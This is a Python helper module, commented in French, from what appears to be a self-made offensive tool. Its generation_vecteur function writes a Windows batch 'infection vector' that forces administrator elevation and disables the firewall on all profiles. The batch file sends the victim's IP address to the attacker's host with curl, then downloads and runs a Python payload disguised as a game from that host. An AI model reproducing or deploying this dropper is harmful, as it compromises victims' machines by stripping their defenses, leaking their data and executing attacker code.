"""
Author: Martin Calamel
Created: 2025-02-26
Description: fichier avec toutes les fonctions utiles pour les fichiers qui ne serons pas envoyer.
TODO: 
"""

# importation des modules
import socket
import os
from colorama import Fore
from info import Info



def get_ip() -> str:
    """
    # get_ip
    ## Presentation
    Fonction pour déterminer l’**adresse IP de la machine**
    ## Fonctionnement
    Via un socket on se connecte a internet `(8.8.8.8)` et on regarde l'adresse de la connection.  
    Par default si aucune adresse n'est trouver on affiche un message d'erreur  
    et l'adresse hôte retourner est celle du *localhost*
    ## Entrées
    Aucune entrées
    ## Sortie
    * HOST : str, adresse IP de l'hôte
    """
    try:
        s : socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        host : str = s.getsockname()[0]
        s.close()
        Info.valide(f"Adresse IP de l'hôte : {host}")
    except:
        Info.erreur("Vous n'êtes pas connecter a internet\n    -> Attribution de l'adresse IP localhost : 127.0.0.1")
        host : str = "127.0.0.1"
    return host



def menu() -> None:
    """
    Fonction pour afficher le Menu du début
    """
    print()
    print(Fore.RED)
    print("███████         ███████ ██ ██████  ███████ ████████ \n   ███          ██      ██ ██   ██ ██         ██    \n  ███           █████   ██ ██████  ███████    ██    \n ███            ██      ██ ██   ██      ██    ██    \n███████ ███████ ██      ██ ██   ██ ███████    ██    \n",Fore.WHITE)
    print()
    print(Fore.GREEN,"              coded By macalamel",Fore.WHITE)
    print()


def generation_vecteur(host : str, output : str = "payload") -> None:
    """
    # generation_vecteur
    ## Presentation
    Fonction pour générer le vecteur d'infection
    ## Fonctionnement
    * Suppression si il existe du vecteur
    * Création du nouveau fichier
    * Écriture du vecteur
    * Fermeture du fichier
    * Message de validation
    ## Entrées
    * host : str, adresse IP de l'hôte
    * output : str, Nom du fichier
    ## Sorties
    Aucunes sorties
    """
    os.system(f"del {output}.bat")
    fich=open(f'{output}.bat','w')
    msg=f"@echo off\nnet session >nul 2>&1\nif %errorLevel% neq 0 (\npowershell -Command \"Start-Process cmd -ArgumentList '/c \\\"%~fnx0\\\"' -Verb RunAs\"\nexit /b\n)\nNetSh Advfirewall set allprofiles state off\n(for /F \"tokens=16\" %%i in (\'\"ipconfig | findstr IPv4\"\') do (curl -d %%i http://{host}:8888/))\ncurl http://{host}:8000/payload/jeu.pyw -o jeu.py\npython jeu.py"
    fich.write(msg)
    fich.close()
    Info.valide(f"Vecteur crée avec le nom : {output}.bat")
    return None

def save_ip(host) -> None:
    """
    
    """